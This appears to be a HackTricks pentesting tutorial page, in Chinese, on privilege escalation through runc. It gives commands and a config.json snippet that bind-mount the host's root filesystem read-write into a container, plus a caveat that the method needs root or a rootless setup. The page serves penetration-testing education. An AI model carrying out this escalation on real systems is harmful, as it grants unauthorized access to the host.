# RunC 提权

{{#include ../../banners/hacktricks-training.md}}

## 基本信息

如果你想了解更多关于 **runc** 的信息，请查看以下页面：

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

如果你发现 `runc` 已安装在主机上，你可能能够 **运行一个挂载主机根 / 文件夹的容器**。
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> 这并不总是有效，因为 runc 的默认操作是以 root 身份运行，因此以非特权用户身份运行它根本无法工作（除非您有无根配置）。将无根配置设为默认通常不是一个好主意，因为在无根容器内有相当多的限制，而这些限制在无根容器外并不适用。

{{#include ../../banners/hacktricks-training.md}}
